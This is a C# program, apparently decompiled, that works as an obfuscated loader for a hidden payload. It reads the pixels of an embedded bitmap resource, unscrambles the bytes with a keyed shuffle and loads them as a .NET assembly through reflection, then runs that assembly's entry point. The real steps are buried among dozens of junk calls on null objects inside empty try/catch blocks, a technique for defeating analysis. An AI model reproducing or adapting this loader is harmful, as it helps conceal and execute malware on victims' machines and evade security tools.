using System;
using System.CodeDom;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Specialized;
using System.Configuration;
using System.Configuration.Provider;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Printing;
using System.Drawing.Text;
using System.IO;
using System.IO.Compression;
using System.IO.IsolatedStorage;
using System.Net;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Net.Security;
using System.Reflection;
using System.Reflection.Emit;
using System.Resources;
using System.Runtime.Remoting.Messaging;
using System.Runtime.Remoting.Proxies;
using System.Runtime.Serialization;
using System.Text;

namespace FashionEater;

internal static class FashionEater
{
	private static void CuspsDawn()
	{
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_0077: Expected O, but got Unknown
		try
		{
			RealProxy val = null;
			val.SetCOMIUnknown(default(IntPtr));
			ModuleBuilder moduleBuilder = null;
			Type[] genericTypeArguments = null;
			Type[] genericMethodArguments = null;
			moduleBuilder.ResolveType(0, genericTypeArguments, genericMethodArguments);
		}
		catch
		{
		}
		ResourceManager resourceManager = new ResourceManager("GerontologyDenotational.Properties.Resources", typeof(FashionEater).Assembly);
		try
		{
			DeflateStream deflateStream = null;
			deflateStream.Flush();
			CookieContainer cookieContainer = null;
			CookieCollection cookies = null;
			cookieContainer.Add(cookies);
		}
		catch
		{
		}
		Bitmap val2 = (Bitmap)resourceManager.GetObject("DetachingDivergent");
		try
		{
			MemoryStream memoryStream = null;
			memoryStream.ReadByte();
			BinaryReader binaryReader = null;
			_ = (double)binaryReader.ReadSingle();
		}
		catch
		{
		}
		try
		{
			NetworkInterface networkInterface = null;
			networkInterface.GetPhysicalAddress();
			ASCIIEncoding aSCIIEncoding = null;
			string s = null;
			byte[] bytes = null;
			aSCIIEncoding.GetBytes(s, 0, 0, bytes, 0);
		}
		catch
		{
		}
		int num = 884;
		try
		{
			Queue queue = null;
			queue.Clear();
		}
		catch
		{
		}
		num += 573;
		try
		{
			PerformanceCounter val3 = null;
			val3.RemoveInstance();
		}
		catch
		{
		}
		int num2 = 0;
		try
		{
			CodeDomProvider val4 = null;
			val4.CreateParser();
			UTF32Encoding uTF32Encoding = null;
			byte[] bytes2 = null;
			uTF32Encoding.GetChars(bytes2);
		}
		catch
		{
		}
		Color[] array = new Color[((Image)val2).get_Height() * ((Image)val2).get_Width()];
		try
		{
			TypeBuilder typeBuilder = null;
			string name = null;
			Type returnType = null;
			Type[] types = null;
			typeBuilder.GetProperty(name, returnType, types);
			DynamicILInfo dynamicILInfo = null;
			dynamicILInfo.GetTokenFor(default(RuntimeMethodHandle));
		}
		catch
		{
		}
		for (int i = 0; i < ((Image)val2).get_Height(); i++)
		{
			num += 417;
			for (int j = 0; j < ((Image)val2).get_Width(); j++)
			{
				num += 185;
				ref Color reference = ref array[num2++];
				reference = val2.GetPixel(j, i);
				num += 958;
			}
		}
		try
		{
			CodeAttributeArgumentCollection val5 = null;
			CodeAttributeArgument val6 = null;
			val5.Add(val6);
			SerializationInfo serializationInfo = null;
			string name2 = null;
			serializationInfo.AddValue(name2, default(DateTime));
		}
		catch
		{
		}
		byte[] array2 = new byte[num2 * 3];
		try
		{
			ConstructorBuilder constructorBuilder = null;
			constructorBuilder.GetMethodBody();
			EventLog val7 = null;
			string text = null;
			val7.RegisterDisplayName(text, 0L);
		}
		catch
		{
		}
		int num3 = 0;
		try
		{
			string text2 = null;
			char[] separator = null;
			text2.Split(separator);
			SettingsProviderCollection val8 = null;
			((ProviderCollection)val8).SetReadOnly();
		}
		catch
		{
		}
		for (int k = 0; k < num2; k++)
		{
			num += 709;
			array2[num3++] = array[k].B;
			num += 762;
			array2[num3++] = array[k].G;
			num += 12;
			array2[num3++] = array[k].R;
			num += 476;
		}
		try
		{
			PropertyInfo propertyInfo = null;
			propertyInfo.GetIndexParameters();
			DirectoryInfo directoryInfo = null;
			directoryInfo.Create();
		}
		catch
		{
		}
		EnablesDefinitional(array2, 8336, 2071204975u, 0);
		try
		{
			ILGenerator iLGenerator = null;
			OpCode opcode = default(OpCode);
			double arg = 0.0;
			iLGenerator.Emit(opcode, arg);
			ReturnMessage val9 = null;
			val9.GetOutArgName(0);
		}
		catch
		{
		}
		string text3 = "System.Reflection";
		try
		{
			ObjectManager objectManager = null;
			objectManager.DoFixups();
			Graphics val10 = null;
			val10.ReleaseHdcInternal(default(IntPtr));
		}
		catch
		{
		}
		text3 += ".Assembly";
		try
		{
			HttpListenerPrefixCollection httpListenerPrefixCollection = null;
			string[] array3 = null;
			httpListenerPrefixCollection.CopyTo(array3, 0);
			Module module = null;
			string name3 = null;
			Type[] types2 = null;
			module.GetMethod(name3, types2);
		}
		catch
		{
		}
		Type type = Type.GetType(text3);
		try
		{
			AuthenticationSchemeSelector authenticationSchemeSelector = null;
			HttpListenerRequest httpRequest = null;
			authenticationSchemeSelector(httpRequest);
			SerializationInfo serializationInfo2 = null;
			string name4 = null;
			serializationInfo2.GetByte(name4);
		}
		catch
		{
		}
		MethodInfo method = type.GetMethod("Load", new Type[1] { typeof(byte[]) });
		try
		{
			Graphics val11 = null;
			val11.IsVisible(0, 0);
			NameValueCollection nameValueCollection = null;
			string name5 = null;
			nameValueCollection.GetValues(name5);
		}
		catch
		{
		}
		Assembly assembly = (Assembly)method.Invoke(null, new object[1] { array2 });
		try
		{
			ConstructionResponse val12 = null;
			Header[] array4 = null;
			((MethodResponse)val12).HeaderHandler(array4);
			ModuleBuilder moduleBuilder2 = null;
			moduleBuilder2.IsResource();
			DefaultTraceListener defaultTraceListener = null;
			string message = null;
			string category = null;
			defaultTraceListener.WriteLine(message, category);
		}
		catch
		{
		}
		assembly.EntryPoint!.Invoke(null, new object[0]);
		try
		{
			CodeDomProvider val13 = null;
			TextReader textReader = null;
			val13.Parse(textReader);
			PropertyBuilder propertyBuilder = null;
			propertyBuilder.GetRawConstantValue();
			UnicodeEncoding unicodeEncoding = null;
			unicodeEncoding.GetDecoder();
		}
		catch
		{
		}
	}

	private static void FabricatingDisapprobation()
	{
	}

	private static void EnablesDefinitional(byte[] ContingentsDictatorships, int HaircutsHoes, uint ColitisDebilitate, int CustomerHittable)
	{
		int num = 968;
		try
		{
			MemoryStream memoryStream = null;
			memoryStream.GetBuffer();
		}
		catch
		{
		}
		num = 954;
		try
		{
			GenericTypeParameterBuilder genericTypeParameterBuilder = null;
			genericTypeParameterBuilder.GetArrayRank();
			AssemblyBuilder assemblyBuilder = null;
			assemblyBuilder.GetModules();
		}
		catch
		{
		}
		for (int num2 = HaircutsHoes; num2 != 0; num2--)
		{
			int num3 = (int)(ColitisDebilitate % (uint)HaircutsHoes);
			num += 393;
			byte b = ContingentsDictatorships[num3];
			num += 483;
			ContingentsDictatorships[num3] = ContingentsDictatorships[num2 - 1];
			num += 282;
			ContingentsDictatorships[num2 - 1] = b;
			num = 891;
			num = 1545;
			num = 2340;
			ColitisDebilitate = (ColitisDebilitate >> 25) | (ColitisDebilitate << 7);
			num = 765;
			num = 1230;
			num = 1963;
			ColitisDebilitate -= (uint)HaircutsHoes;
			num = 147;
			num = 942;
			num = 1695;
			ColitisDebilitate -= 1234012339;
			num = 683;
			num = 1277;
			num = 1348;
			ColitisDebilitate -= 555551;
		}
	}

	private static void ForearmedFruiting()
	{
	}

	private static void Main()
	{
		try
		{
			PropertyInfo propertyInfo = null;
			propertyInfo.GetRawConstantValue();
			TextReader textReader = null;
			textReader.ReadToEnd();
			RealProxy val = null;
			val.SetCOMIUnknown(default(IntPtr));
			ModuleBuilder moduleBuilder = null;
			Type[] genericTypeArguments = null;
			Type[] genericMethodArguments = null;
			moduleBuilder.ResolveType(0, genericTypeArguments, genericMethodArguments);
			DeflateStream deflateStream = null;
			deflateStream.Flush();
			CookieContainer cookieContainer = null;
			CookieCollection cookies = null;
			cookieContainer.Add(cookies);
			MemoryStream memoryStream = null;
			memoryStream.ReadByte();
			BinaryReader binaryReader = null;
			_ = (double)binaryReader.ReadSingle();
			SortedList sortedList = null;
			sortedList.Clear();
			AppDomain appDomain = null;
			string cachePath = null;
			appDomain.SetCachePath(cachePath);
			ApplicationSettingsBase val2 = null;
			((SettingsBase)val2).Save();
			Type type = null;
			type.GetArrayRank();
			AssemblyBuilder assemblyBuilder = null;
			assemblyBuilder.GetName();
			PrinterSettings val3 = null;
			val3.SetHdevnames(default(IntPtr));
			UnicodeEncoding unicodeEncoding = null;
			char[] chars = null;
			unicodeEncoding.GetBytes(chars);
		}
		catch
		{
		}
		CuspsDawn();
		try
		{
			ListDictionary listDictionary = null;
			Array array = null;
			listDictionary.CopyTo(array, 0);
			HttpListener httpListener = null;
			httpListener.Abort();
			UTF32Encoding uTF32Encoding = null;
			char[] chars2 = null;
			uTF32Encoding.GetBytes(chars2);
			CodeParser val4 = null;
			TextReader textReader2 = null;
			val4.Parse(textReader2);
			AssemblyBuilder assemblyBuilder2 = null;
			string name = null;
			assemblyBuilder2.GetType(name, throwOnError: false, ignoreCase: false);
			StreamWriter streamWriter = null;
			double value = 0.0;
			streamWriter.Write(value);
			BinaryReader binaryReader2 = null;
			binaryReader2.ReadDecimal();
			NetworkInterface networkInterface = null;
			networkInterface.GetPhysicalAddress();
			ASCIIEncoding aSCIIEncoding = null;
			string s = null;
			byte[] bytes = null;
			aSCIIEncoding.GetBytes(s, 0, 0, bytes, 0);
			Queue queue = null;
			queue.Clear();
			PerformanceCounter val5 = null;
			val5.RemoveInstance();
			UTF32Encoding uTF32Encoding2 = null;
			byte[] bytes2 = null;
			uTF32Encoding2.GetChars(bytes2);
			TypeBuilder typeBuilder = null;
			string name2 = null;
			Type returnType = null;
			Type[] types = null;
			typeBuilder.GetProperty(name2, returnType, types);
			DynamicILInfo dynamicILInfo = null;
			dynamicILInfo.GetTokenFor(default(RuntimeMethodHandle));
			CodeAttributeArgumentCollection val6 = null;
			CodeAttributeArgument val7 = null;
			val6.Add(val7);
			SerializationInfo serializationInfo = null;
			string name3 = null;
			serializationInfo.AddValue(name3, default(DateTime));
			ConstructorBuilder constructorBuilder = null;
			constructorBuilder.GetMethodBody();
			EventLog val8 = null;
			string text = null;
			val8.RegisterDisplayName(text, 0L);
			string text2 = null;
			char[] separator = null;
			text2.Split(separator);
			SettingsProviderCollection val9 = null;
			((ProviderCollection)val9).SetReadOnly();
			PropertyInfo propertyInfo2 = null;
			propertyInfo2.GetIndexParameters();
			DirectoryInfo directoryInfo = null;
			directoryInfo.Create();
			ILGenerator iLGenerator = null;
			OpCode opcode = default(OpCode);
			double arg = 0.0;
			iLGenerator.Emit(opcode, arg);
			ReturnMessage val10 = null;
			val10.GetOutArgName(0);
			ObjectManager objectManager = null;
			objectManager.DoFixups();
			Graphics val11 = null;
			val11.ReleaseHdcInternal(default(IntPtr));
			HttpListenerPrefixCollection httpListenerPrefixCollection = null;
			string[] array2 = null;
			httpListenerPrefixCollection.CopyTo(array2, 0);
			Module module = null;
			string name4 = null;
			Type[] types2 = null;
			module.GetMethod(name4, types2);
			AuthenticationSchemeSelector authenticationSchemeSelector = null;
			HttpListenerRequest httpRequest = null;
			authenticationSchemeSelector(httpRequest);
			SerializationInfo serializationInfo2 = null;
			string name5 = null;
			serializationInfo2.GetByte(name5);
			Graphics val12 = null;
			val12.IsVisible(0, 0);
			NameValueCollection nameValueCollection = null;
			string name6 = null;
			nameValueCollection.GetValues(name6);
			ConstructionResponse val13 = null;
			Header[] array3 = null;
			((MethodResponse)val13).HeaderHandler(array3);
			ModuleBuilder moduleBuilder2 = null;
			moduleBuilder2.IsResource();
			DefaultTraceListener defaultTraceListener = null;
			string message = null;
			string category = null;
			defaultTraceListener.WriteLine(message, category);
			CodeDomProvider val14 = null;
			TextReader textReader3 = null;
			val14.Parse(textReader3);
			PropertyBuilder propertyBuilder = null;
			propertyBuilder.GetRawConstantValue();
			UnicodeEncoding unicodeEncoding2 = null;
			unicodeEncoding2.GetDecoder();
			FontCollection val15 = null;
			val15.Dispose();
			AuthenticatedStream authenticatedStream = null;
			authenticatedStream.Flush();
			IsolatedStorageFileStream isolatedStorageFileStream = null;
			isolatedStorageFileStream.ReadByte();
			CodeParameterDeclarationExpressionCollection val16 = null;
			CodeParameterDeclarationExpression val17 = null;
			val16.Insert(0, val17);
			StringBuilder stringBuilder = null;
			stringBuilder.Insert(0, 0u);
			CollectionBase collectionBase = null;
			collectionBase.Clear();
			StreamReader streamReader = null;
			streamReader.ReadLine();
			Type type2 = null;
			Type attributeType = null;
			type2.GetCustomAttributes(attributeType, inherit: false);
			DefaultTraceListener defaultTraceListener2 = null;
			string message2 = null;
			string detailMessage = null;
			defaultTraceListener2.Fail(message2, detailMessage);
			string text3 = null;
			text3.PadRight(0, '\0');
			StringBuilder stringBuilder2 = null;
			float value2 = 0f;
			stringBuilder2.Insert(0, value2);
			UTF7Encoding uTF7Encoding = null;
			uTF7Encoding.GetMaxCharCount(0);
			CodeTypeDeclarationCollection val18 = null;
			CodeTypeDeclaration val19 = null;
			val18.Insert(0, val19);
			SslStream sslStream = null;
			string targetHost = null;
			sslStream.AuthenticateAsClient(targetHost);
			AlternateViewCollection alternateViewCollection = null;
			alternateViewCollection.RemoveAt(0);
			StringDictionary stringDictionary = null;
			stringDictionary.Clear();
			TypeBuilder typeBuilder2 = null;
			ConstructorInfo con = null;
			byte[] binaryAttribute = null;
			typeBuilder2.SetCustomAttribute(con, binaryAttribute);
			NegotiateStream negotiateStream = null;
			negotiateStream.AuthenticateAsServer();
			CodeAttributeDeclarationCollection val20 = null;
			((CollectionBase)(object)val20).RemoveAt(0);
			SizeConverter sizeConverter = null;
			sizeConverter.GetPropertiesSupported();
			MemoryStream memoryStream2 = null;
			memoryStream2.WriteByte(0);
			StackFrame stackFrame = null;
			stackFrame.GetMethod();
		}
		catch
		{
		}
	}

	private static void CurtailedDischarges()
	{
	}
}
